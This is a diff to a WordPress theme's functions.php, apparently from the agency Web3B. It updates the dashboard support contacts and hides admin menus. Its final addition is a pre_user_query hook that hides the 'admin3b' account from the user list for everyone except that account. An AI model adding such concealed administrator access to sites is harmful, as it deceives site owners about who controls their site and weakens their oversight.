@@ -1,7 +1,6 @@
 <?php
 /**
  * 
- *
  * @link 
  *
  * @package SH_Theme
@@ -12,7 +11,7 @@ function custom_dashboard_help() {
 	Hệ thống được phát triển bởi <strong>Web3B</strong> trên nền tảng <strong>Wordpress</strong>.<br />
 	Để xem hướng dẫn quản trị website, vui lòng xem tại link sau : <a target="_blank" href="http://thietkeweb3b.com/huong-dan-quan-tri/">Hướng dẫn quản trị Website</a> <br />
 	Mọi thắc mắc, lỗi trong quá trình sử dụng Quý khách hàng có thể liên hệ bộ phận Kỹ Thuật :<br/>
-	<strong>Điện thoại </strong>: 0981.631.777 ( giờ hành chính )<br/>
+	<strong>Điện thoại </strong>: 0981.631.777 - 024.62.590.333( giờ hành chính )<br/>
 	<strong>Email</strong>: kythuat.web3b@gmail.com <br/>
 	<strong>Web</strong>: <a href="http://thietkeweb3b.com"> thietkeweb3b.com </a><br/>
 	Cảm ơn quý khách đã tin tưởng và sử dụng sản phẩm của chúng tôi.
@@ -63,7 +62,7 @@ function remove_menus() {
 	 	remove_menu_page( 'tools.php' );
 	 	remove_menu_page( 'options-general.php' );
 	 	remove_menu_page( 'edit-comments.php' );
-	 	// remove_menu_page( 'edit.php?post_type=acf-field-group' );
+	 	remove_menu_page( 'edit.php?post_type=acf-field-group' );
     	remove_menu_page( 'wpcf7' );
 	}
 }
@@ -81,3 +80,14 @@ function remove_unnecessary_wordpress_menus(){
 	}
 }
 add_action('admin_menu', 'remove_unnecessary_wordpress_menus', 999);
+
+function yoursite_pre_user_query($user_search) {
+	global $current_user;
+	$username = $current_user->user_login;
+	if ($username != 'admin3b') {
+		global $wpdb;
+		$user_search->query_where = str_replace('WHERE 1=1',
+		"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin3b'",$user_search->query_where);
+	}
+}
+add_action('pre_user_query','yoursite_pre_user_query');
